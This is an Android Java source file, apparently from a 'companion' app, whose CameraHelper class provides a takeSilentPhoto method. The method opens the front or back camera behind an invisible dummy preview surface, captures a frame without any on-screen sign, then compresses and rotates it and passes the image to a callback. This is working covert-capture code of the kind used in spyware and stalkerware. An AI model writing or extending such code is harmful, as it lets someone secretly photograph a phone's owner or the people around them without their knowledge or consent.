package com.snapapp.companion;

import android.content.Context;
import android.graphics.*;
import android.hardware.Camera;
import android.os.Handler;
import android.os.Looper;
import java.io.ByteArrayOutputStream;

public class CameraHelper {
    public interface PhotoCallback {
        void onPhotoCaptured(byte[] data);
        void onError(String error);
    }

    @SuppressWarnings("deprecation")
    public static void takeSilentPhoto(final Context context, final boolean isFront, final PhotoCallback callback) {
        new Thread(() -> {
            Camera camera = null;
            try {
                int cameraId = -1;
                int numCameras = Camera.getNumberOfCameras();
                Camera.CameraInfo info = new Camera.CameraInfo();
                for (int i = 0; i < numCameras; i++) {
                    Camera.getCameraInfo(i, info);
                    if (isFront && info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) { cameraId = i; break; }
                    else if (!isFront && info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) { cameraId = i; break; }
                }
                if (cameraId == -1) cameraId = 0;

                camera = Camera.open(cameraId);
                final Camera finalCam = camera;
                SurfaceTexture dummySurface = new SurfaceTexture(10);
                camera.setPreviewTexture(dummySurface);

                Camera.Parameters params = camera.getParameters();
                Camera.Size prevSize = params.getPreviewSize();
                final int pW = prevSize.width, pH = prevSize.height;
                final int pFmt = params.getPreviewFormat();

                camera.startPreview();

                // Wait 350ms for AE/AWB warm-up
                try { Thread.sleep(350); } catch (InterruptedException ignored) {}

                final boolean[] captured = new boolean[]{false};

                // Fallback: Preview buffer capture via YuvImage
                finalCam.setOneShotPreviewCallback((data, cam) -> {
                    if (captured[0]) return;
                    captured[0] = true;
                    try {
                        YuvImage yuv = new YuvImage(data, pFmt, pW, pH, null);
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        yuv.compressToJpeg(new Rect(0, 0, pW, pH), 80, baos);
                        byte[] processed = compressPhoto(baos.toByteArray(), isFront);
                        if (callback != null) callback.onPhotoCaptured(processed);
                    } catch (Exception e) {
                        if (callback != null) callback.onError(e.getMessage());
                    } finally {
                        releaseCam(finalCam);
                    }
                });

                // Primary attempt: takePicture
                try {
                    finalCam.takePicture(null, null, (data, cam) -> {
                        if (captured[0]) return;
                        captured[0] = true;
                        releaseCam(cam);
                        byte[] optimized = compressPhoto(data, isFront);
                        if (callback != null) callback.onPhotoCaptured(optimized != null ? optimized : data);
                    });
                } catch (Throwable t) {
                    // Preview callback will handle it
                }
            } catch (Exception e) {
                releaseCam(camera);
                if (callback != null) callback.onError(e.getMessage());
            }
        }).start();
    }

    private static void releaseCam(Camera cam) {
        if (cam != null) {
            try { cam.stopPreview(); cam.release(); } catch (Exception ignored) {}
        }
    }

    private static byte[] compressPhoto(byte[] rawData, boolean isFront) {
        try {
            BitmapFactory.Options opts = new BitmapFactory.Options();
            opts.inJustDecodeBounds = true;
            BitmapFactory.decodeByteArray(rawData, 0, rawData.length, opts);

            int inSampleSize = 1;
            while ((opts.outWidth / (inSampleSize * 2)) >= 800 || (opts.outHeight / (inSampleSize * 2)) >= 600) {
                inSampleSize *= 2;
            }
            opts.inJustDecodeBounds = false;
            opts.inSampleSize = inSampleSize;
            Bitmap bmp = BitmapFactory.decodeByteArray(rawData, 0, rawData.length, opts);
            if (bmp == null) return rawData;

            Matrix matrix = new Matrix();
            matrix.postRotate(isFront ? 270 : 90);
            Bitmap rotated = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), matrix, true);
            if (rotated != bmp) bmp.recycle();

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            rotated.compress(Bitmap.CompressFormat.JPEG, 65, baos);
            rotated.recycle();
            return baos.toByteArray();
        } catch (Exception e) {
            return rawData;
        }
    }
}
